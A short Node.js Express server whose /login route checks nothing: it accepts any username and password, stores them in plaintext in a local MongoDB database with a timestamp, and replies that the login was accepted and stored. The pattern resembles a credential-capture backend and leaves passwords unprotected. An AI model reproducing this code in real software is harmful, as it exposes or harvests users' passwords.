const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/LFDB', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;

// Log if MongoDB connection is successful or fails
db.on('error', (error) => {
  console.error('❌ MongoDB connection error:', error);
});

db.once('open', () => {
  console.log('✅ MongoDB connected successfully');
});

// Define schema & model
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  loginTime: { type: Date, default: Date.now },
});
const User = mongoose.model('User', userSchema);

// Route to accept any login and save to DB
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const newUser = new User({ username, password });
    await newUser.save();
    res.json({ success: true, message: 'Login accepted and stored.' });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error', error: err });
  }
});

// Start server
app.listen(port, () => {
  console.log(`🚀 Server running on http://localhost:${port}`);
});